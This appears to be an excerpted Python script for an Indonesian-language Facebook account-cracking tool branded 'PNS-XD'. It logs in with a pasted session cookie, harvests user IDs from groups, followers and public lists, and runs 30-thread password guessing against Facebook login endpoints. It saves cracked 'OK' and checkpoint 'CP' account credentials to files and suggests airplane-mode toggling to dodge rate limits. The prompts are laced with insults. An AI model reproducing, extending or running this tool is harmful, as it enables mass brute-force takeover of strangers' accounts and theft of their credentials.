...
def banner():
	print(f'''\t
     {k}698888888       6986986              d8P98        dTb  dTb
     {u}698               698               d8P698      4•   \/   •B
     {h}698               698              d8P 698      6•        •P
     {b}698698698         698             d8P  698      'T;      ;P
     {m}698               698            d8P698698        'T;  ;P'
     {p}698               698           d8P    698         '°\/°
     {u}698             6986986        d8P     698
     
	                 {m}★{k}★{h}★ BUCIN DIKIT NAPA {u}{h}★{k}★{m}★{u}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		...
		try:
			...
			li = '# JARINGAN KABA KARUT, ILUAK I KUDAI'
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t            TOBAT KUDAI [green]KALU DAPAT AZAB[purple] '))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{k}•{u}] Masukkan Cookies :{asu} ')
		...
		print(f'  {u}[{h}•{u}]{h} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{u} ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	gh = 'github.com/Pink-XD'
	cetak(nel('\tSelamat Datang [yellow]%s[purple] GOBLOK'%(my_name)))
	print(f'> Your Idz : '+str(my_id))
	print(f'> Your Ip  : {ip}')
	print(f'> Github   : {gh}')
	print('[bold cyan]SILAKAN PILIH MAU NGAPAIN KAMU [bold cyan]')
	print('')
	cetak(nel('[bold green]1. Crack Publik\n 2. Crack Follower\n 3. Crack Grup\n 4. Crack File\n 5. Hasil Crack  [bold green]')) 
	print('----> 0. Keluar       ')
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'----> 1. Hasil {h}OK{u} Anda ')
	print(f'----> 2. Hasil {k}CP{u} Anda ')
	print('----> 3. Kembali	')
	kz = input(f'\n----> Pilih : ')
	if kz in ['2']:
		...
		if len(vin)==0:
			...
			for isi in vin:
				...
				if cih<10:
					...
					print(f'>> %s. %s ({k} %s {u}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
			...
			for cpku in range(len(lin)):
				...
				print(f'{u}-----> {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{u}[{m} Klik Enter{u} ]')
			back()
	elif kz in ['1']:
		...
		if len(vin)==0:
			...
			for isi in vin:
				...
				if cih<10:
					...
					lol.update({str(cih):str(isi)})
					print(f'----> %s. %s ({h} %s {u}Idz )'%(cih,isi,(len(hem))))
			geeh = input(f'\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('----> Pilih Yang Bener Kontol ')
			...
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{u}----> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{u}[{m} Klik Enter{u} ]')
			back()
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('----> NDAK BEGHAPAW ID? : '))
	except ValueError:
...
def lah():
	print(f'\n{u}----> Total Idz Yang Terkumpul :{h} %s '%(len(id)))
	input(f'{u}----> [ {m}Klik Enter {u}] ')
	print('')
	pass
	setting()
def grup():
	print('')
	id = input(f'{u}----> Masukkan Username Atau Idz Grup : ')
	...
	if len(ang)==0:
		...
		print(f'{u}----> Anggota : {h}%s'%(ang[0]))
	grup1(url)
def grup1(urls):
	use = []
	ses = requests.Session()
	print(f'{u}----> Sedang Mengumpulkan Idz ')
	print(f'----> Klik {k}Ctrl+C{u} Untuk {m}Stop{u} Dump !!')
	while True:
		try:
			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
			miskinlu = {"user-agent": ua}
			...
			for cari in tes:
				...
				if 'mengajukan' in spl:
					...
					if idku in id:
						...
						print(f'\r	———>> {u}({xy} %s {u}) <<———'%(len(id)), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
...
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/PNS-DUMP')
	except FileNotFoundError:
	...
	if len(vin)==0:
		print('')
		cetak(nel('[white][[purple]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah File Dump Id Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] PNS-DUMP[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 4 [white]ini '))
		kontol = input('\n----> Apakah Anda Faham ( Y/t ) ')
		if kontol in ['']:
			print('----> Pilih Yang Bener Asuhh ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{u}] Alhamdulillah Anda Sungguh Pintarr ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\n[{k}x{u}] Anda Sungguh Tolol ')
			time.sleep(3)
			exit()
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/PNS-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			time.sleep(3)
			back()
		try:lin = open('/sdcard/PNS-DUMP/'+geh,'r').read().splitlines()
		except:
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel('\t[bold cyan]• MAU CARI AKUN YG BAGAIMANA? • [/bold cyan]'))
	print('') 
...
#			id2.insert(xx,bacot)
		...
		exit()
		cetak(nel('\t[bold cyan] • SILAKAN PILIH METODE LOGIN MU • [/bold cyan]'))
		print('') 
		cetak(nel('[bold yellow]1. Mobile \n2. Mbasic \n3. Touch \n4. Mtouch [bold yellow]')) 
	print('')
	hc = input('----> Pilih : ')
	if hc in ['1','01']:
...
#		method.append('touch')
		...
		method.append('mobile')
	print('')
	cetak(nel'[bold cyan]Tampilkan Aplikasi Terkait( Y/t ) [bold cyan]')) 
	if _jembot_ in ['']:
		print('>> Pilih Yang Bener Kontol ')
		back()
		...
		taplikasi.append('no')
	cetak(nel('[bold blue]Tambahkan Password Manual ( Y/t ) [bold blue]')) 
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[purple]•[yellow]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[purple]•[yellow]] Contoh :[green] kakak,ngentod,adik[white] '))
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	cetak(nel('[bold cyan]SELAMAT MENUNGGU HASIL [bold cyan]')) 
	print(f'                -------->>>>> {m}★{m}S  {k}A  {h}B  {u}A  {k}R  {h}★{h} <<<<<-------- ')
	print('')
	print(f'----> Hasil {h}OK{u} Tersimpan Di : {h}OK/%s {k}'%(okc))
	print(f'----> Hasil {k}CP{u} Tersimpan Di : {k}CP/%s {u}'%(cpc))
	print(f'----> Mainkan Mode Pesawat Setiap {h}1k{k} Idz\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[purple]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[purple] ✓[white] '))
	print(f'[{m}•{p}]{h} OK : {h}%s '%(ok))
	print(f'{u}[{m}•{p}]{k} CP : {k}%s{u} '%(cp))
	print('')
	...
	if woi in ['y','Y']:
		...
		print(f'\t{u}---->{k} Good Bye Dadaahh{u} <---- ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='PNS-XD CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='PNS-XD OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]PNS-XD OK[/bold green]'))
					ok+=1
					break
...
if __name__=='__main__':
	...
	alvino_xy(f'\n\t{k}忠 {u}Gunawkah teserah kaba \n\t{k}忠{m}amaw adaw  Bug/Error Ngiciak awu\n\t{k}忠{k}Doa ka ajaw aku sehat \n\t{k}忠{h}Dapat bini alap\n\t{k}忠{b}Aminkah mangku kamu dapat amal \n\t{k}忠{p}Jangan pacak Coli tula\n\t{k}忠{hh}Kalu Dapat Azab , ingatkah awak tu belum nikah\n\t{k}忠{u}Cuman sekedar informasi ajaw\n\t{k}忠{h}Kalu gi kepikiran ndak nikah\n\t{k}忠{k}Tapi amaw ndik gila\n\t{k}忠{m}Lantak ka la nga kaba\n\t{k}忠{b}asak ka kaba senang\n\t{k}忠{h}KURANG SENANG TEMUI AKU\n\t{k}忠{b}DI CINTO MANDI\n\t{k}忠{u}NDIK KRUAN CINTO MANDI? \n\t{k}忠{p}KINAK I GOOGLE MAP\n\t{k}忠{h}JANGAN BIGAL NIAN\n\t{k}忠{u}LA BESAK KABA TU{x}')
	time.sleep(3)
	login()
